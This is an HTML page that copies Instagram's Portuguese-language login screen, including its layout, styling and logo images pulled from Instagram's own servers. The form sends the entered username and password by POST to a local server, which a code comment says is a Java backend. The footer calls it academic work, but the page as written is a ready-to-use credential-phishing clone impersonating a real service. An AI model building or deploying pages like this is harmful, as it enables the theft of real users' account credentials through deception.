<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }
        .wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            max-width: 935px;
            width: 100%;
            margin-bottom: 20px;
        }
        .phones-container {
            display: none;
        }
        @media (min-width: 450px) {
            .phones-container {
                display: block;
                background-image: url('https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__b=1');
                background-size: 454px 618px;
                height: 618px;
                width: 454px;
                position: relative;
                margin-right: 32px;
            }
        }
        .form-container {
            display: flex;
            flex-direction: column;
            width: 350px;
        }
        .login-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            margin-bottom: 10px;
            text-align: center;
        }
        .logo {
            margin: 22px 0 36px 0;
        }
        .logo img {
            max-width: 175px;
        }
        .login-form {
            display: flex;
            flex-direction: column;
        }
        .input-field {
            position: relative;
            margin-bottom: 6px;
        }
        .input-field input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 0 7px 8px;
            font-size: 12px;
            color: #262626;
            outline: none;
        }
        .login-button {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #ffffff;
            font-weight: 600;
            font-size: 14px;
            padding: 7px 16px;
            margin-top: 8px;
            cursor: pointer;
            width: 100%;
        }
        .login-button:hover {
            background-color: #1877f2;
        }
        .separator {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }
        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .or {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
            text-transform: uppercase;
        }
        .facebook-login {
            display: flex;
            justify-content: center;
            align-items: center;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin-top: 8px;
            margin-bottom: 12px;
        }
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 12px;
            display: block;
        }
        .signup-box {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        footer {
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 40px;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="phones-container"></div>
        <div class="form-container">
            <div class="login-box">
                <div class="logo">
                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" alt="Instagram">
                </div>
                <!-- Formulário ajustado para enviar POST para o servidor Java -->
                <form class="login-form" action="/login" method="POST">
                    <div class="input-field">
                        <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required>
                    </div>
                    <div class="input-field">
                        <input type="password" name="password" placeholder="Senha" required>
                    </div>
                    <button type="submit" class="login-button">Entrar</button>
                </form>
                <div class="separator">
                    <div class="line"></div>
                    <div class="or">ou</div>
                    <div class="line"></div>
                </div>
                <a href="#" class="facebook-login">Entrar com o Facebook</a>
                <a href="#" class="forgot-password">Esqueceu a senha?</a>
            </div>
            <div class="signup-box">
                <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
            </div>
        </div>
    </div>
    <footer>
        &copy; 2026 Instagram from Meta (Trabalho Acadêmico)
    </footer>
</body>
</html>
